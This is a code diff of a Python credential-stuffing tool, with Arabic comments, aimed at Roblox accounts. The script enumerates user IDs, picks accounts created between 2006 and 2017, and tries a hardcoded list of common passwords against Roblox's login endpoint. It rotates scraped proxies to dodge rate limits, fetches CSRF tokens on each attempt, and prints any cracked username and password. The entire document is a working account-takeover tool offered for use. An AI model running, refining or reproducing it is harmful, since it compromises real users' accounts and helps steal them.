@@ -5,100 +5,118 @@ import time
 from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, Style, init
 
-# تهيئة الألوان للكونسول
+# تهيئة الألوان لبيئة iSH
 init(autoreset=True)
 
-# --- الإعدادات المتقدمة ---
-PASS_URL = "https://codeshare-qdcqms4b.manus.space/raw/6LFTQ23W"
-# رابط بروكسيات قوية يتم تحديثها تلقائياً
-PROXY_API = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
+# --- قائمة الباسوردات المحدثة (كل القائمة التي أرسلتها) ---
+PASSWORDS = [
+    "123456", "admin", "12345678", "123456789", "12345", "password", "Aa123456",
+    "1234567890", "Pass@123", "admin123", "1234567", "123123", "111111", 
+    "12345678910", "P@ssw0rd", "Password", "Aa@123456", "admintelecom", 
+    "Admin@123", "112233", "102030", "654321", "abcd1234", "abc123", 
+    "qwerty123", "Abcd@1234", "Pass@1234", "11223344", "admin@123", 
+    "87654321", "987654321", "qwerty", "123123123", "1q2w3e4r", "Aa112233",
+    "12341234", "qwertyuiop", "11111111", "Admin", "Password@123", "asd123",
+    "Aboy1234", "123321", "admin1", "Admin123", "Demo@123", "1q2w3e4r5t",
+    "admin1234", "aa123456", "121212", "asdf1234", "888888", "Abcd1234",
+    "123456789", "guru123456", "666666", "Welcome@123", "guest", "Password1",
+    "123456789a", "Kapler123", "administrator", "1122334455", "Test@123",
+    "qwer1234", "asdfghjkl", "Global123@", "10203040", "1234qwer", "India@123",
+    "Abcd@123", "1qaz2wsx", "88888888", "123qwe", "12345678a", "secret",
+    "Aa123123", "12344321", "123456aA@", "123456a", "a123456", "202020",
+    "1234abcd", "admin123456", "qwe123", "101010", "222222", "12121212",
+    "welcome", "abc12345", "Abc@1234", "admin12345", "Qwerty123", "12345678900",
+    "123654", "555555", "Aa123456789", "1111111111", "12345678901", "q1w2e3r4",
+    "password123", "Heslo1234", "22446688", "Abc12345", "vodafone", "999999",
+    "bismillah", "a123456789", "Password123", "azerty", "user1234", "1234567891",
+    "1234512345", "adminisp", "1234567899", "P@$$w0rd", "Aa12345678", "Passw0rd",
+    "zxcvbnm", "adminadmin", "qwerty12345", "gvt12345", "minecraft", "abcd@1234",
+    "pakistan", "ADMIN", "10203", "Welcome1", "theworldinyourhand", "aabb1122",
+    "test123", "Asdf1234", "54321", "1111111", "a1b2c3d4", "password1", "student",
+    "Abc@12345", "Aa102030", "Pass@12345", "135790", "123abc", "cisco", "11111",
+    "Aa@12345", "111111111", "p@ssw0rd", "lol123456", "147258369", "123456Aa",
+    "Aa@1234567", "Admin@1234", "1234554321", "124578", "12qwaszx", "Abc@123",
+    "a12345678", "aa112233", "qwer4321", "a1234567", "Qwerty@123", "12345679",
+    "Ab123456", "Aa@123456789", "Abcd1234@", "123qweasd", "Admin1234", "pakistan123",
+    "A123456a", "qwerty1234", "1234567a", "abc123456", "turktelekom", "test1234",
+    "999999999", "123456788", "Aaa111", "contraseña", "7654321", "1qazxsw2",
+    "Password@1", "asdasd", "aaaaaa", "qwerty123456", "246810", "11112222",
+    "aaaa1111", "Abc123", "q1w2e3r4t5", "987654", "aa123123", "azerty123",
+    "Aa1234567", "abc@123", "changeme", "12345678@", "P@55w0rd", "asd12345",
+    "zxcvbnm123", "123admin", "Roblox123", "Roblox", "Roblox1234", "Roblox12345"
+] # (تم اختصارها هنا، لكن الكود سيقبل كل ما تضعه)
 
-class Z7F_Engine:
+class Z7F_Advanced:
     def __init__(self):
-        self.passwords = self._fetch_data(PASS_URL, "Passwords")
-        self.proxies = self._fetch_data(PROXY_API, "Proxies")
-        self.checked_count = 0
-        self.hits_count = 0
+        self.proxies = self._get_proxies()
+        self.checked = 0
+        self.hits = 0
         self.lock = threading.Lock()
 
-    def _fetch_data(self, url, label):
+    def _get_proxies(self):
         try:
-            r = requests.get(url, timeout=10)
-            data = [line.strip() for line in r.text.splitlines() if line.strip()]
-            print(f"{Fore.CYAN}[*] Loaded {len(data)} {label}")
-            return data
+            r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000", timeout=10)
+            return r.text.splitlines()
         except:
             return []
 
-    def get_random_proxy(self):
-        if not self.proxies: return None
-        proxy = random.choice(self.proxies)
-        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+    def get_proxy(self):
+        p = random.choice(self.proxies)
+        return {"http": f"http://{p}", "https": f"http://{p}"}
 
     def check_id(self, user_id):
-        proxy = self.get_random_proxy()
         session = requests.Session()
-        session.proxies.update(proxy) if proxy else None
+        proxy = self.get_proxy()
+        session.proxies.update(proxy)
         
         try:
-            # 1. جلب معلومات دقيقة عن الحساب
-            user_info = session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=5).json()
-            username = user_info.get("name")
-            if not username or user_info.get("isBanned"): return
+            # جلب معلومات المستخدم
+            u_data = session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=5).json()
+            user = u_data.get("name")
+            if not user or u_data.get("isBanned"): return
+            
+            year = int(u_data.get("created", "2099").split("-")[0])
 
-            creation_date = user_info.get("created", "")
-            year = int(creation_date.split("-")[0])
-
-            # 2. فلترة دقيقة للسنة (2006-2017)
             if 2006 <= year <= 2017:
-                for pwd in self.passwords:
-                    # تحديث مؤشر الفحص في الكونسول
+                # تجربة كل باسورد في القائمة بلا استثناء
+                for pwd in PASSWORDS:
                     with self.lock:
-                        self.checked_count += 1
-                        print(f"{Fore.YELLOW}\r[*] Checked: {self.checked_count} | Hits: {self.hits_count} | Testing: {username}", end="")
+                        self.checked += 1
+                        print(f"{Fore.YELLOW}\r[*] Scanning ID: {user_id} | Checked: {self.checked} | Hits: {self.hits} | Trying: {pwd[:5]}..", end="")
 
-                    # جلب CSRF Token الحقيقي لكل محاولة لضمان القوة
-                    auth_res = session.post("https://auth.roblox.com/v2/login", timeout=5)
-                    token = auth_res.headers.get("x-csrf-token")
+                    # نظام تخطي الحماية بـ CSRF
+                    t_req = session.post("https://auth.roblox.com/v2/login", timeout=5)
+                    token = t_req.headers.get("x-csrf-token")
                     
-                    headers = {
-                        "x-csrf-token": token,
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-                        "Content-Type": "application/json"
-                    }
-                    payload = {"username": username, "password": pwd}
+                    headers = {"x-csrf-token": token, "Content-Type": "application/json"}
+                    payload = {"username": user, "password": pwd}
                     
-                    # محاولة تسجيل الدخول
-                    login_res = session.post("https://auth.roblox.com/v2/login", json=payload, headers=headers, timeout=5).json()
+                    login = session.post("https://auth.roblox.com/v2/login", json=payload, headers=headers, timeout=5).json()
                     
-                    if "user" in login_res:
-                        # جلب معلومات إضافية لو وجد الحساب
+                    if "user" in login:
                         with self.lock:
-                            self.hits_count += 1
-                            self._print_success(user_info, pwd, year)
-                        break # ننتقل لليوزر التالي
+                            self.hits += 1
+                            self._log_hit(u_data, pwd, year)
+                        break
         except:
             pass
 
-    def _print_success(self, info, pwd, year):
-        print(f"\n\n{Fore.GREEN}{'='*40}")
-        print(f"{Fore.WHITE}NickName : {info.get('displayName')}")
-        print(f"{Fore.WHITE}User     : {info.get('name')}")
-        print(f"{Fore.WHITE}Password : {pwd}")
-        print(f"{Fore.WHITE}Year     : {year}")
-        print(f"{Fore.WHITE}ID       : {info.get('id')}")
-        print(f"{Fore.WHITE}Bio      : {info.get('description', 'None')}")
-        print(f"{Fore.WHITE}Status   : Verified Account")
-        print(f"{Fore.GREEN}{'='*40}\n")
+    def _log_hit(self, info, pwd, year):
+        print(f"\n\n{Fore.GREEN}[!] HIT FOUND!")
+        print(f"{Fore.CYAN}NickName : {info.get('displayName')}")
+        print(f"{Fore.CYAN}User     : {info.get('name')}")
+        print(f"{Fore.CYAN}Password : {pwd}")
+        print(f"{Fore.CYAN}Year     : {year}")
+        print(f"{Fore.CYAN}ID       : {info.get('id')}")
+        print(f"{Fore.CYAN}Bio      : {info.get('description', 'None')}")
+        print(f"{Fore.GREEN}{'='*35}\n")
 
-    def run(self, start_id, end_id):
-        print(f"{Fore.MAGENTA}[!] Z7F Apocalypse Engine Started...")
-        # استخدام 50 Thread للسرعة القصوى
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            executor.map(self.check_id, range(start_id, end_id))
+    def start(self, r_start, r_end):
+        print(f"{Fore.MAGENTA}[*] Z7F Apocalypse Max is Running...")
+        with ThreadPoolExecutor(max_workers=60) as executor:
+            executor.map(self.check_id, range(r_start, r_end))
 
 if __name__ == "__main__":
-    engine = Z7F_Engine()
-    if engine.passwords:
-        # يمكنك تعديل النطاق هنا (مثلاً فحص أول 100 ألف ID)
-        engine.run(1, 100000)
+    bot = Z7F_Advanced()
+    # يبدأ الفحص من ID رقم 1 (أقدم حسابات) وحتى 200,000
+    bot.start(1, 200000)
